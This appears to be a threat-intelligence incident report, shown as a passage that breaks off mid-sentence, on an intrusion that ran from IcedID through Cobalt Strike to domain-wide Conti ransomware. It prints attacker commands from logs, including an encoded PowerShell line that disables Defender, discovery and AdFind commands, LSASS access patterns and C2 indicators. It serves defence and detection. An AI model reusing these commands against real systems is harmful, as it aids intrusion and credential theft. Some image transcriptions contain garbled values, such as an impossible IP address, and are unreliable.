    "markdown": "# Stolen Images Campaign Ends in Conti Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nconti\nexploit\nicedid\nransomware\n\n**Published on:** April 4, 2022\n\n---\n\nIn this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector. IcedID is a banking trojan that first appeared in 2017, usually delivered via malspam campaigns and has been widely used as an initial access vector in multiple ransomware intrusions.\n\nUpon execution of the IcedID DLL, discovery activity was performed which was followed by the dropping of a Cobalt Strike beacon on the infected host. Along the way, the threat actors installed remote management tools such as Atera and Splashtop for persisting in the environment. While remaining dormant most of the time, the adversary deployed Conti ransomware on the 19th day (shortly after Christmas), resulting in domain-wide encryption.\n\n## Case Summary\n\nWe assess with high confidence that the “Stolen Image Evidence” email campaign was used to deliver the IcedID DLL. This was first reported by Microsoft in April 2021.\n\nUpon execution of the IcedID DLL, a connection to a C2 server was established. This was followed by the creation of a scheduled task on the beachhead host to establish persistence. The task executed the IcedID payload every one hour. The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.\n\nAfter a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host. Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain. Nltest and net group were utilized to look for sensitive groups such as Domain Admins and Enterprise Admins. Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.\n\nThe threat actors proceeded to install remote management tools such as Atera Agent and Splashtop. Use of these 3rd party administrative tools allows the threat actors another “legitimate” means of persistence and access if they were to lose their malware connection. In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration. Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.\n\nOn the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder. On the following day, the seventh day of the intrusion, the threat actors made their next move. On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used. From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.\n\nAfter getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access. From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again. After this, the threat actors went quiet.\n\nOn day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time. On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL. A little discovery check-in was observed on the 14th day, but little else.\n\nOn the 19th day, the threat actors moved towards their final objectives. They reviewed the directory structure of several hosts including domain controllers and backup servers. They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat. However, they found that their execution failed.\n\nThey left for a few hours, and then returned, and attempted to exploit a couple of CVE’s in an attempt to escalate privileges. The threat actors had already secured domain admin access but it’s possible the operator may have thought they lacked permissions when their first ransomware execution failed.\n\nWhile these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers. Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller. This time the execution worked as intended and resulted in domain-wide ransomware.\n\n## Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Stolen Images Campaign Ends in Conti Ransomware\nDescription: The image is a detailed timeline of events related to a cyber attack campaign identified as 'Stolen Images Campaign Ends in Conti Ransomware.' It outlines specific actions taken during various days, labeled from Day 1 to Day 19, with timestamps indicating when each event occurred. The timeline includes entries for IceID execution, command and control activities, process injections, credential access, discovery actions, software installations on beachheads and domain controllers, lateral movements, and finally, the impact of ransomware deployment. Each entry is associated with specific file names and actions taken by the attackers, providing a comprehensive overview of the attack sequence.\nTranscription: |\n  Stolen Images Campaign Ends in Conti Ransomware\n  \n  Day 1\n  23:14 UTC - IcedID Execution\n      R6SVR32.EXE\n  23:14 UTC - IcedID Command and Control\n      g.guogchrome.com\n      5.181.80.214:30\n  23:14 UTC - Persistence\n      Scheduled Task\n  23:15 UTC - Discovery\n      cmd.exe /c chcp 437\n      WMIC Node:localhost /Namespace:\\\\root\\security\\center Path AntiVirusProduct Get /Format:List\n      ipconfig /all\n      systeminfo\n      net config workstation\n      nttest /domain:trusts\n  \n  Day 2\n  01:06 UTC - Cobalt Strike Beacon\n      Facluy.exe\n  01:26 UTC - Process Injection\n      Facluy.exe = explorer.exe\n  01:40 UTC - Credential Access\n      dllhost.exe access to less memory\n  15:53 UTC - Process Injection\n      rundll32.exe = wlogin.exe\n  \n  Day 6\n  19:51 UTC - Discovery\n      C:\\Windows\\system32\\cmd.exe /c nttest /list\n      Invoke: ShareFinder\n  \n  Day 7\n  01:28 UTC - Remote Access Software Install on Beachhead\n      MAgent.exe\n      Sqlahp://https://mamer5346.exe\n  14:58 UTC - Cobalt Strike Command and Control\n      quick32.dll\n      Ewag.dll\n      Edbeef.dll\n      wayjey.com (172.241.219.52)\n  \n  Day 9\n  14:01 UTC - Remote Access Software Install on Domain Controller\n      C:\\Windows\\System32\\msiexec.exe /i C:\\programdata\\agent.msi\n      Agent.exe\n  \n  Day 10\n  New Cobalt Strike Command and Control\n      26.713.59.33:30 (cyhur.com)\n  \n  Day 14\n  19:54 UTC - New Cobalt Strike Beacon & Disable Defender on Beachhead\n      rundll32.exe C:\\programdata\\file.dll\n      BlingBlingServer\n      Downloaded and executed by the Agent.exe\n      powershell -nop -exec bypass -EncodedCommand ...\n  \n  Day 19\n  17:04 UTC - Discovery\n      net group /domain \"Domain Admins\"\n      C:\\Windows\\system32\\cmd.exe /c nttest /list\n  \n  16:25 UTC - Backup Discovery\n      cmd.exe /c \"dir %VSS%\\\" > backup.txt\n  \n  22:11 UTC - Privilege Escalation Attempt (CVE-2021-42278 and CVE-2021-42287)\n      Scanning activity\n      QueryName: SAMTHADMIN%2\n      Image: C:\\Windows\\system32\\dllhost.exe\n  \n  22:31 UTC - Impact: Data Encrypted Ransomware executed via domain controller\n      cmd.exe /c backup.bat\n      regsvr32.exe /s /u /n /e /size 10 -\n      nomute.exe /p VSS/TOC/4.dll\n      connections via SMB to encrypt and deploy ransom note.\n```\n\n## Initial Access\n\nThe IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a “Stolen Image Evidence” email campaign.\n\n> \"Stolen Images\" #ContactForms campaign that submits \"https://t.co/uc4QkLQt4b\" links into contact us forms now dropping an .iso file and #IcedID dll.\n> — Sean (@infosecfu) December 9, 2021\n\nThese initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets.\n\nThe emails contain a link to a legitimate storage service like those offered by Google and Microsoft. In this example, “http://storage.googleapis.com” was used to host a zip file. The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file. Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.\n\nBelow is a configuration extraction of that initial IcedID malware from an automated sandbox analysis of the sample:\n\n```\n{\n  \"Campaign ID\": 870605016,\n  \"C2 url\": \"guguchrome.com\"\n}\n```\n\n## Execution\n\nThe graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:\n\n```image\nAlt: Execution Graph\nDescription: The image is a detailed execution graph illustrating the actions performed during a cyber attack related to the Conti ransomware campaign. It features various nodes showing the sequence of actions, including commands executed (e.g., 'regsvr32.exe'), processes created (e.g., 'Winlogon.exe', 'explorer.exe'), and connections made to different IP addresses and domains. Additionally, it lists various technical details like file paths, network commands, and the overall flow of the attack. The graph visually represents the malicious activities and their relationships, providing valuable insights into the attack methodology.\nTranscription: |\n  Stolen Images Campaign Ends in Conti Ransomware\n  \n  Malicious DLL executed\n  - regsvr32.exe C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\baeb1ee3a7fcaba9d20ef573dcea69fcf31f2ec21f458b2f9f9350cb3e3.dll\n  - regsvr32.exe /s C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Ewge.dll\n  - C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Faicuv4.exe\n  \n  Connect to\n  - 45.142.213.228 : 80\n  - 5.181.80.113 : 443 --> applesflying.com\n  - 91.90.212.52 : 80\n  - 5.181.80.214 : 80 --> gucghrome.com\n  - 192.198.88.110 : 80\n  - 99.84.243.73 : 443\n  - 23.106.223.27 : 443 --> www.rihatin.com\n  \n  Access Process\n  - Winlogon.exe\n  - explorer.exe\n  \n  Create Remote Thread\n  - regsvr32.exe\n  - svchost.exe\n  \n  Load\n  - C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Edebef4.dll\n  \n  Ransomware execution\n  - regsvr32.exe /s /n /i:\"m\" -net -size 10 -nometex -p 1\\%REDACTED%\\CS* x64.dll\n  \n  Drop file\n  - C:\\Windows\\System32\\spool\\x64.dll\n  - C:\\Windows\\System32\\downlevel\\x64.dll\n  - C:\\Windows\\System32\\spool\\backup.bat\n```\n\n## Persistence\n\n### Scheduled Tasks\n\nOnly one scheduled task was created during this intrusion. The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:\n\n```\n<Exec>\n    <Command>rundll32.exe</Command>\n    <Arguments>\"C:\\Users\\REDACTED\\AppData\\Local\\{C904416E-A880-3136-ED72-AA63AF7DB1F2}\\Gaagsp2.dll\",DllMain --ob=\"CapitalLadder\\license.dat\"</Arguments>\n</Exec>\n```\n\n### Atera Agent\n\nThreat actors dropped and installed Atera agent (T1219), using two MSI packages “sql.msi” and “mstsc.msi”, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.\n\n```image\nAlt: Atera Agent\nDescription: The image displays a table summarizing actions taken during a cyber intrusion involving the installation of the Atera agent. The table includes columns for 'Computer Name', 'Initiating Process Command Line', 'Action Type', 'Folder Path', and 'File Name'. It lists actions such as file creation for the MSI packages 'mstsc.msi' and 'sql.msi', indicating that these files were dropped on specific systems, including a 'Beachhead' and a 'Domain Controller'. This data is relevant for understanding the attack vector and persistence mechanisms used by the threat actors.\nTranscription: |\n  | Computer Name     | Initiating Process Command Line | Action Type | Folder Path            | File Name |\n  | ----------------- | ------------------------------- | ----------- | ---------------------- | --------- |\n  | Beachhead         | Explorer.EXE                    | FileCreated | C:\\ProgramData         | mstsc.msi |\n  |                   | Explorer.EXE                    | FileCreated | \\\\Domain Controller\\C$ | mstsc.msi |\n  | Domain Controller | winlogon.exe                    | FileCreated | C:\\ProgramData         | sql.msi   |\n```\n\nThe installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:\n\n```\n/IntegratorLogin=\"marsmors1947@gmail.com\" /AccountId=\"0013z00002kcnS1AAI\"\n/IntegratorLogin=\"hughess6623@outlook.com\" /AccountId=\"0013z00002kbhSdAAI\"\n```\n\nAtera agent is a remote monitoring and management system.\n\nAt one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.\n\n```image\nAlt: Atera Beacon\nDescription: The image displays a detailed output from a command line interface, showing the process creation details of the Atera agent installation. It includes various technical attributes such as the Process GUID, Process ID, file version, description, company details, command line executed, and hashes for integrity verification. This information is relevant for understanding the threat actor's methods and the specific command used to run the Atera agent on the compromised system.\nTranscription: |\n  \"Process Create:\n  RuleName: technique_id=T1059, technique_name=Command-Line Interface\n  UtcTime: {78271c4c-3ba6-61be-d7b5-020000000580}\n  ProcessGuid: {78271c4c-3ba9-61be-d5b5-020000000580}\n  ProcessId: 8212\n  Image: C:\\Windows\\System32\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: \"cmd.exe\"\n  CurrentDirectory: C:\\Windows\\system32\\\n  User: NT AUTHORITY\\SYSTEM\n  LogonGuid: {78271c4c-9fc7-612a-e703-000000000000}\n  LogonId: 0x1E7\n  TerminalSessionId: 0\n  IntegrityLevel: System\n  Hashes: SHA1=77B818918276D4B36144355929C042FB8D, MD5=32145035015122E6ACE9691197ABE3F, SHA256=100348525B388A5DB0095BB09EFD0EBC22680892F8E0F92AC7ED5909492B4F6, IMPHASH=272245E2988E1E430500B852C4FB5E18\n  ParentProcessId: 6716\n  ParentImage: C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\AgentPackageRunCommandInteractive.exe\n  ParentCommandLine: \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\AgentPackageRunCommandInteractive.exe\" 96550093-7d53-4a54-9644-38a6b2fe6f10 \"734ac2a8-ebec-4be1-89b2-3e378f7f3922\" agent-api.atera.com/Production 443 or8ixLi90Mf \"cmd_bf5\"\n```\n\n```image\nAlt: Atera Beacon\nDescription: The image displays a detailed output of a process creation event related to the Windows host process (rundll32.exe). It includes various technical details such as the process GUID, file version, command line used, and integrity level. Specific parameters like the image path, user account, and associated hashes (SHA-1 and SHA-256) are also included, which are critical for forensic analysis in cybersecurity.\nTranscription: |\n  \"Process Create:\n  RuleName: technique_id=T1218.002, technique_name=rundll32.exe\n  UtcTime:  2021-10-04 12:34:56.000000\n  ProcessGuid: {78271c4c-3bb4-61be-db5-202000000050}\n  ProcessId: 8732\n  Image: C:\\Windows\\System32\\rundll32.exe\n  FileVersion:\n  Description: Windows host process (Rundll32)\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: RUNDLL32.EXE\n  CommandLine: rundll32.exe C:\\ProgramData\\file.dll DllRegisterServer\n  CurrentDirectory: C:\\Windows\\system32\\\n  User: NT AUTHORITY\\SYSTEM\n  LogonGuid: {78271c4c-9f7c-612a-e703-000000000000}\n  LogonId: 0x3E7\n  TerminalSessionId: 0\n  IntegrityLevel: System\n  Hashes: SHA1=84DBB234151485B26686C7A94293024B1D5E021BF0D096123F7D312, SHA256=F1DC9560D0C381C78304D94F7BA46949001D79728A803C2DD32C8E957FC9F923, IMPHASH=4DB27267734D1576D75C991DC790F68AC\n  ParentProcessId: 8212\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentCommandLine: \"cmd.exe\"\n```\n\n## Privilege Escalation\n\nThere were attempts to exploit Active Directory vulnerabilities CVE-2021-42278 and CVE-2021-42287 in order to create privileged accounts. This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number). The query status 9003 indicates that this does not exist.\n\nThe injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:\n\n```image\nAlt: SAMTHEADMIN\nDescription: The image displays a table containing DNS query information related to the accounts SAMTHEADMIN-92 and SAMTHEADMIN-20. It includes columns for 'QueryName', 'QueryStatus', and 'Image'. Both queries have a status code of 9003, indicating that the requested accounts do not exist. The 'Image' column shows the path to the dllhost.exe process associated with these queries, specifically located in the C:\\Windows\\system32\\ directory.\nTranscription: |\n  | QueryName      | QueryStatus | Image                           |\n  | -------------- | ----------- | ------------------------------- |\n  | SAMTHEADMIN-92 | 9003        | C:\\Windows\\system32\\dllhost.exe |\n  | SAMTHEADMIN-20 | 9003        | C:\\Windows\\system32\\dllhost.exe |\n```\n\nWe believe the operator used the publicly available script ‘sam_the_admin‘ or a variant based on it. Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.\n\n```image\nAlt: SAMTHEADMIN Script\nDescription: The image displays a code snippet in Python, illustrating a function named 'samtheadmin'. The function generates a new computer name in the format 'SAMTHEADMIN-XX' where 'XX' is a random integer between 1 and 100. Additionally, it creates a random password composed of 12 characters from a specified set. This code is part of a script related to privilege escalation and attack methods discussed in the context of a Conti ransomware campaign.\nTranscription: |\n  def samtheadmin(options):\n      new_computer_name = f\"SAMTHEADMIN-{random.randint(1,100)}$\"\n      new_computer_password = ''.join(random.choice(characters) for _ in range(12))\n```\n\nThe exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.\n\n## Defense Evasion\n\n### Disable Defender\n\nA base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).\n\nEncoded Command:\n\n```\npowershell -nop -exec bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=\n```\n\nThe decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender’s real time monitoring:\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\n### Process Injection\n\nA number of process injections were seen during this intrusion. The Cobalt Strike beacon used the **CreateRemoteThread** Win32 function in order to inject code into running processes. The usage of this function triggers the Sysmon Event ID 8, a well-known pattern of CS beacon activity.\n\nRemote threads were created in Winlogon and Explorer processes.\n\n```image\nAlt: Process Injection\nDescription: The image displays a detailed log of Sysmon events related to process injection activities associated with a security incident. It includes timestamps, source and target process IDs, process GUIDs, and images, along with specific function calls (e.g., 'CreateRemoteThread') and addresses. The logs indicate two instances of remote thread creation, one in 'Winlogon' and another in 'explorer.exe', with relevant event IDs and technique IDs, providing valuable technical information for threat analysis.\nTranscription: |\n  \"Microsoft-Windows-Sysmon/Operational\",,,,,\"xxxxxxxxxxxxxx\",,,,,,\"8\",\"144589\"\n  UtcTime: 15:53:25.364\n  SourceProcessGuid: {78271c4c-76f5-61b3-6561-000000000500}\n  SourceProcessId: 2116\n  SourceImage: C:\\Windows\\System32\\regsvr32.exe\n  TargetProcessGuid: {78271c4c-a286-61a3-7105-000000000500}\n  TargetProcessId: 1680\n  TargetImage: C:\\Windows\\System32\\winlogon.exe\n  NewThreadId: 5468\n  StartAddress: 0x000002029E1B0008\n  StartModule: -\n  StartFunction: -\"\"0\",\"0\",\"650\",\"{5770385}\",,,\"\"CreateRemoteThread detected:\n  \n  \"Microsoft-Windows-Sysmon/Operational\",,,,,\"xxxxxxxxxxxxxx\",,,,,,\"8\",\"81102\"\n  UtcTime: 01:26:20.895\n  SourceProcessGuid: {78271c4c-a7fe-61b2-b534-000000000500}\n  SourceProcessId: 9560\n  SourceImage: C:\\Users\\xxxxxx\\AppData\\Local\\Temp\\Faicy4.exe\n  TargetProcessGuid: {78271c4c-9fc-61a2-8e00-000000000500}\n  TargetProcessId: 6284\n  TargetImage: C:\\Windows\\explorer.exe\n  NewThreadId: 10360\n  StartAddress: 0x0000000003520002\n  StartModule: -\n  StartFunction: -\"\"0\",\"0\",\"650\",\"{5770385}\",,,\"\"CreateRemoteThread detected:\n```\n\n## Credential Access\n\n### LSASS Access\n\nThe threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.\n\n```image\nAlt: LSASS Access\nDescription: The image is a screenshot detailing the memory read activity of the 'dllhost.exe' process accessing the 'lsass.exe' process memory. It includes metrics such as the number of bytes copied (6223310), the number of reads (1868), and the action time. Additionally, it references the MITRE technique T1003.001, indicating it relates to LSASS memory access. A warning at the bottom highlights the action as 'Sensitive credential memory read,' indicating the potential security implications of this access.\nTranscription: |\n  dllhost.exe read lsass.exe process memory\n  \n  Bytes copied: 6223310\n  Number of reads: 1868\n  Action time:\n  Mitre techniques: T1003.001: LSASS Memory\n  Target process: [732] lsass.exe\n  \n  Sensitive credential memory read\n```\n\nThe screenshot below shows the different “DesiredAccess” to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:\n\n```image\nAlt: LSASS Access\nDescription: The image is a screenshot of a table detailing various access attempts to the LSASS process. It lists columns for 'Computer Name', 'Process Command Line', 'Additional Fields', 'Action Type', and 'Initiating Process Command Line'. The 'Additional Fields' column specifically highlights the 'DesiredAccess' values attempted during these actions, which are crucial for understanding the context of credential dumping attempts. This technical data is relevant to cyber threat intelligence, particularly in identifying and analyzing potential unauthorized access.\nTranscription: |\n  | **Computer Name** | **Process Command Line** | **Additional Fields**     | **Action Type**    | **Initiating Process Command Line**                                    |\n  | ----------------- | ------------------------ | ------------------------- | ------------------ | ---------------------------------------------------------------------- |\n  |                   | lsass.exe                | { \"DesiredAccess\": 5136 } | OpenProcessApiCall | \"taskmgr.exe\" /4                                                       |\n  |                   | lsass.exe                | { \"DesiredAccess\": 64 }   | OpenProcessApiCall | rundl132.exe \\\\<blackacted>\\c$\\ProgramData\\c64.dll, StartA             |\n  |                   | lsass.exe                | { \"DesiredAccess\": 4112 } | OpenProcessApiCall | dllhost.exe                                                            |\n  |                   | lsass.exe                | { \"DesiredAccess\": 5136 } | OpenProcessApiCall | taskmgr.exe                                                            |\n  |                   | lsass.exe                | { \"DesiredAccess\": 64 }   | OpenProcessApiCall | regsvr32.exe /s \"C:\\Users\\<blackacted>\\AppData\\Local\\Temp\\Edebef4.dll\" |\n```\n\nThe table below maps the “DesiredAccess” values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:\n\n| **Desired Access** | **Hex value** | **Process Access Rights**                                                                                                | **Offensive Tools**              |\n| ------------------ | ------------- | ------------------------------------------------------------------------------------------------------------------------ | -------------------------------- |\n| 5136               | 1410          | **PROCESS_VM_READ (0x0010)**<br>**PROCESS_QUERY_INFORMATION (0x0400)**<br>**PROCESS_QUERY_LIMITED_INFORMATION (0x1000)** | Mimikatz (Winver <5)<br>NanoDump |\n| 4112               | 1010          | **PROCESS_VM_READ (0x0010)**<br>**PROCESS_QUERY_LIMITED_INFORMATION (0x1000)**                                           | Mimikatz (Winver >=6)            |\n| 64                 | 40            | **PROCESS_DUP_HANDLE (0x0040)**                                                                                          | MirrorDump<br>HandleKatz         |\n\n*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.*\n\nThose “DesiredAccess” values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.\n\nIn our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.\n\n## Discovery\n\nMultiple discovery techniques were observed throughout the case. The initial discovery techniques were conducted on the beachhead host by the IcedID malware – focusing on determining the system language and security products installed (T1518.001). Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.\n\nDiscovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.\n\n```\ncmd.exe /c chcp >&2\nipconfig /all\nsysteminfo\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet group \"Domain Admins\" /domain\ncmd.exe /C nltest /dclist:\ncmd.exe /C net group /domain \"Domain Computers\"\ncmd.exe /C net group /domain \"Enterprise Admins\"\n```\n\nThreat actors also used “chcp” for discovery of the system locale/language (T1614.001). Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language). In this case, the existing control page language was collected using the following command:\n\n```\ncmd.exe /c chcp >&2\n```\n\nAs a test, entering this on a command prompt shows a numeric value. The Microsoft link shows the number of the language used (437 – United States).\n\n```image\nAlt: ChCP Output\nDescription: The image displays the output of a command executed in a command prompt window, specifically the output of the command 'chcp >&2'. It shows that the active code page is 437, which corresponds to the United States system locale. The command is executed by a user in the directory 'C:\\Users\\user'. The text is presented in a green font on a black background, typical of a command line interface.\nTranscription: |\n  C:\\Users\\user>chcp >&2\n  Active code page: 437\n```\n\nIt is highly likely that the threat actors were establishing the country of origin based on the language used – an extra fail-safe check to ensure certain users or regions were not targeted. The `>&2` parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr.\n\nThe second discovery was from a different Cobalt Strike beacon “Faicuy4.exe” which focused on domain discovery and user groups using the net command.\n\nOnce the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).\n\n```image\nAlt: AdFind\nDescription: The image displays a command line output related to various commands executed in a cybersecurity context. It shows a list of command line instructions involving the execution of 'cmd.exe' with different parameters, specifically commands for running batch files and utilizing the 'adfind.exe' utility for querying Active Directory objects. The commands are organized in a tabular format, indicating specific object categories such as 'person', 'computer', 'organizationalUnit', and 'group', along with additional flags and options used in the queries, which are relevant for threat detection and analysis.\nTranscription: |\n  Process Command Line\n  cmd.exe /C adf.bat\n  cmd.exe /C adf.bat\n  conhost.exe 0xffffffff -ForceV1\n  adfind.exe -f \"(objectcategory=person)\"\n  adfind.exe -f \"(objectcategory=person)\"\n  adfind.exe -f \"objectcategory=computer\"\n  adfind.exe -f \"objectcategory=computer\"\n  adfind.exe -f \"(objectcategory=organizationalUnit)\"\n  adfind.exe -f \"(objectcategory=organizationalUnit)\"\n  adfind.exe -sc trustdmp\n  adfind.exe -sc trustdmp\n  adfind.exe -subnets -f (objectCategory=subnet)\n  adfind.exe -subnets -f (objectCategory=subnet)\n  adfind.exe -f \"(objectcategory=group)\"\n  adfind.exe -f \"(objectcategory=group)\"\n  adfind.exe -gcb -sc trustdmp\n  adfind.exe -gcb -sc trustdmp\n```\n\n‘adf.bat’ is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion. The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.\n\nThe PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.\n\n```image\nAlt: Invoke-ShareFinder\nDescription: The image displays a command output from the PowerShell module Invoke-ShareFinder. It shows the parameter bindings for the command, indicating various settings and their values for checking share access across a network. The output lists several network shares, including administrative shares like \\C$ and \\SYSVOL, along with annotations suggesting their purposes, such as 'Remote Admin' and 'Default share.' This information is relevant to understanding the network configuration and potential targets during a cybersecurity investigation.\nTranscription: |\n  CommandInvocation(Invoke-ShareFinder): \"Invoke-ShareFinder\"\n  ParameterBinding(Invoke-ShareFinder): name=\"CheckShareAccess\"; value=\"True\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Verbose\"; value=\"True\"\n  ParameterBinding(Invoke-ShareFinder): name=\"HostList\"; value=\"\"\n  ParameterBinding(Invoke-ShareFinder): name=\"ExcludePrint\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"ExcludeIPC\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"NoPing\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"CheckAdmin\"; value=\"False\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Delay\"; value=\"0\"\n  ParameterBinding(Invoke-ShareFinder): name=\"Domain\"; value=\"\"\n  CommandInvocation(Out-File): \"Out-file\"\n  ParameterBinding(Out-File): name=\"Encoding\"; value=\"ascii\"\n  ParameterBinding(Out-File): name=\"FilePath\"; value=\"C:\\ProgramData\\shda.txt\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\ADMIN$ - Remote Admin\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\install - \"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\NETLOGON - Logon server share\"\n  ParameterBinding(Out-File): name=\"InputObject\"; value=\"\\\\SYSVOL - Logon server share\"\n```\n\nSome network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).\n\n```image\nAlt: Ping Discovery\nDescription: The image displays a log of command lines executed in a Windows environment, specifically related to the execution of the 'ping' command. It shows multiple instances of 'cmd.exe /C ping' followed by obscured IP addresses or hostnames, indicating network discovery attempts made by a threat actor. The presence of 'conhost.exe' commands suggests these pings are being executed from console windows, and the parameters used indicate possible attempts to force specific network-related behaviors or configurations.\nTranscription: |\n  Process Command Line\n  cmd.exe /C ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  conhost.exe 0xffffffff -ForceV1\n  ping \\\\<REDACTED>\\\n  ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  cmd.exe /C ping \\\\<REDACTED>\\\n  conhost.exe 0xffffffff -ForceV1\n  ping \\\\<REDACTED>\\\n  ping \\\\<REDACTED>\\\n```\n\nFilesystem discovery (T1083) was conducted to collect directory lists to a text file.\n\n```image\nAlt: Filesystem Discovery\nDescription: The image shows a command line output from a Windows command prompt. It contains the command line that was executed, specifically `C:\\Windows\\system32\\cmd.exe /C dir \"\\<REDACTED>\\C$\" /s >> list.txt`, indicating that a directory listing of a remote system (the administrative share C$) was being saved to a file named 'list.txt'. Additionally, it shows the current directory from which this command was executed, which is `C:\\ProgramData\\`. This output is relevant to the context of discovering filesystem information during a cybersecurity incident.\nTranscription: |\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C dir \"\\\\<REDACTED>\\C$\" /s >> list.txt\n  CurrentDirectory: C:\\ProgramData\\\n```\n\nOther variations included:\n\n- `C:\\Windows\\system32\\cmd.exe /C dir “\\\\<REDACTED>\\C$” /s >> listback.txt`\n- `C:\\Windows\\system32\\cmd.exe /C dir “\\\\<REDACTED>\\C$” /s >> list1.txt`\n\n## Lateral Movement\n\nOn the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL’s onto a domain controller and another server.\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a tabular data representation showing network traffic information. The columns include source IP/country, source port, destination IP/country, destination port, number of packets, total data in databytes/bytes, and additional file information. The rows list different source IP addresses and associated metrics for communication over port 445, which is commonly used for SMB (Server Message Block) traffic. The 